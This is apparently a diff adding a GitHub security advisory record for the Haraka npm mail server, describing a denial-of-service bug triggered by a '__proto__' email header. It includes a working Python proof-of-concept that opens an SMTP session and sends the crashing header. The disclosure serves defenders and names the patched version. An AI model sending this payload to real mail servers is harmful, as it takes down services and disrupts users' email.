@@ -1,0 +1,50 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-04-01T22:56:12Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "Haraka"
+  },
+  "Advisory": {
+    "DatabaseId": 346493,
+    "Id": "GSA_kwCzR0hTQS14cGgzLXIyamYtNHZwM84ABUl9",
+    "GhsaId": "GHSA-xph3-r2jf-4vp3",
+    "References": [
+      {
+        "Url": "https://github.com/haraka/Haraka/security/advisories/GHSA-xph3-r2jf-4vp3"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-xph3-r2jf-4vp3"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-xph3-r2jf-4vp3"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-34752"
+      }
+    ],
+    "Description": "### Summary\n\nSending an email with `__proto__:` as a header name crashes the Haraka worker process. \n\n### Details\n\nThe header parser at `node_modules/haraka-email-message/lib/header.js:215-218` stores headers in a plain `{}` object:\n\n```javascript\n_add_header(key, value, method) {\n    this.headers[key] ??= []          // line 216\n    this.headers[key][method](value)  // line 217\n}\n```\n\nWhen `key` is `__proto__`:\n1. `this.headers['__proto__']` returns `Object.prototype` (the prototype getter)\n2. `Object.prototype` is not null/undefined, so `??=` is skipped\n3. `Object.prototype.push(value)` throws `TypeError: not a function`\n\nThe TypeError reaches the global `uncaughtException` handler at `haraka.js:26-33`, which calls `process.exit(1)`:\n\n```js\nprocess.on('uncaughtException', (err) =\u003e {\n    if (err.stack) {\n        err.stack.split('\\n').forEach((line) =\u003e logger.crit(line))\n    } else {\n        logger.crit(`Caught exception: ${JSON.stringify(err)}`)\n    }\n    logger.dump_and_exit(1)\n})\n```\n\n### PoC\n\n```python\nimport socket, time\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)\nsock.connect((\"127.0.0.1\", 2525))\nsock.recv(4096)\nsock.sendall(b\"EHLO evil\\r\\n\"); sock.recv(4096)\nsock.sendall(b\"MAIL FROM:\u003cx@x.com\u003e\\r\\n\"); sock.recv(4096)\nsock.sendall(b\"RCPT TO:\u003cuser@haraka.local\u003e\\r\\n\"); sock.recv(4096)\nsock.sendall(b\"DATA\\r\\n\"); sock.recv(4096)\n# Crash payload\nsock.sendall(b\"From: x@x.com\\r\\n__proto__: crash\\r\\n\\r\\nbody\\r\\n.\\r\\n\")\n```\n\n### Impact\n\nIn single-process mode (`nodes=0`), the entire server goes down. In cluster mode, the master restarts the worker, but all sessions are lost.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-04-01T22:56:09Z",
+    "Severity": "HIGH",
+    "Summary": "Haraka affected by DoS via `__proto__` email header",
+    "UpdatedAt": "2026-04-01T22:56:12Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.1.4"
+      },
+      "VulnerableVersionRange": "\u003c= 3.1.3"
+    }
+  ]
+}
